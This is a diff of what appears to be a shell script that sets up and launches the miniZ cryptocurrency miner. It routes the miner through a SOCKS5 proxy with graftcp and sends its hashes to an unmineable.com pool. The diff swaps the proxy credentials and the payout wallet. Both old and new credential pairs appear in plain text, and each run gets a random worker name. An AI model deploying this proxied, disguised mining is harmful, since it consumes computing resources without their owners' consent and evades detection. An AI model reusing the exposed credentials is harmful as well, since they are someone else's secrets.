@@ -24,9 +24,9 @@ loglevel = 1
 
 socks5 = 209.127.191.180:9279
 
-socks5_username = ehrfetal
+socks5_username = vevnmgyr
 
-socks5_password = 5pxchgpzzz0t
+socks5_password = yueiyilj1bgg
 
 END
 
@@ -45,4 +45,4 @@ tar xf miniZ_v1.8y3_linux-x64.tar.gz
 
 ph add miniZ
 
-./graftcp/graftcp ./miniZ -u TRX:TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-999 -n 1)-cuan) -l ethash.unmineable.com --port=3333 -p x --par=ethash
+./graftcp/graftcp ./miniZ -u SAITAMA:0x055947F6FB5C3daF37326086B93649A756Ab6247.$(echo $(shuf -i 1-999 -n 1)-LORD) -l ethash.unmineable.com --port=3333 -p x --par=ethash
